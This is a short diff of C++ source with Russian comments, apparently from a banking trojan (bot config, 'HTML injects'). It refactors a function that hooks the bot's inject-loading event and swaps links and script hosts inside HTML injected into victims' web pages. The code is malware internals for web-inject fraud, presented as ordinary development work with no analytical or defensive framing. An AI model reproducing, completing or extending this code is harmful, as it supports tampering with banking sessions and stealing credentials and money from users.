@@ -178,25 +178,6 @@ void AZInjectsLoadedEvent(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam
 
 
 //----------------------------------------------------
-//  AzInizializeHTMLInjects  - Функция инициализирует
-//  систему подмены ссылок в HTML инжектах
-//----------------------------------------------------
-void AzInizializeHTMLInjects()
-{
-	// перебираем инжекты и ищем в них вхождение параметра
-	TBotConfig* Config = Config::GetConfig();
-	if (Config)
-	{
-		// Подключаемся к событию загрузки HTML инжектов
-		Config->HTMLInjects->AttachEvent(BOT_EVENT_HTMLINJECTS_LOADED, AZInjectsLoadedEvent);
-		AZInjectsLoadedEvent(Config->HTMLInjects, 0, 0, 0);
-	}
-}
-//-----------------------------------------------------------------------------
-
-
-
-//----------------------------------------------------
 // AzCheckScriptHosts - Функция запускает проверку
 // хостов вшиваемых в HTML инжекты
 //----------------------------------------------------
@@ -225,14 +206,30 @@ string AzGetScriptHost()
 	// Запрашиваем рабочий хост
 	return AZDATA::Checker->GetWorkHost();
 }
-//-----------------------------------------------------------------------------
-#else
-
-void AzInizializeHTMLInjects()
-{
-}
 
 
 
 //-----------------------------------------------------------------------------
 #endif
+
+
+//----------------------------------------------------
+//  AzInizializeHTMLInjects  - Функция инициализирует
+//  систему подмены ссылок в HTML инжектах
+//----------------------------------------------------
+void AzInizializeHTMLInjects()
+{
+	#ifdef USE_AZ_CONFIG
+	// перебираем инжекты и ищем в них вхождение параметра
+	TBotConfig* Config = Config::GetConfig();
+	if (Config)
+	{
+		// Подключаемся к событию загрузки HTML инжектов
+		Config->HTMLInjects->AttachEvent(BOT_EVENT_HTMLINJECTS_LOADED, AZInjectsLoadedEvent);
+		AZInjectsLoadedEvent(Config->HTMLInjects, 0, 0, 0);
+	}
+	#endif
+}
+//-----------------------------------------------------------------------------
+
+
